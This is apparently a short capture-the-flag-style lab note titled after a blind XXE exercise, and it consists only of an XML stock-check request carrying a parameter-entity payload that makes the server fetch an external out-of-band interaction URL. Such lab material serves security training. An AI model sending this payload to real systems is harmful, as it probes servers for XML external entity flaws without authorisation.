---
title: "4 - Blind XXE with out-of-band interaction via XML parameter entities"
---

# 4 - Blind XXE with out-of-band interaction via XML parameter entities

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://qtncv1nwpiahkodasopofpceg5mwaoyd.oastify.com"> %xxe; ]>
<stockCheck>
<productId>1</productId><storeId>1</storeId>
</stockCheck>
```
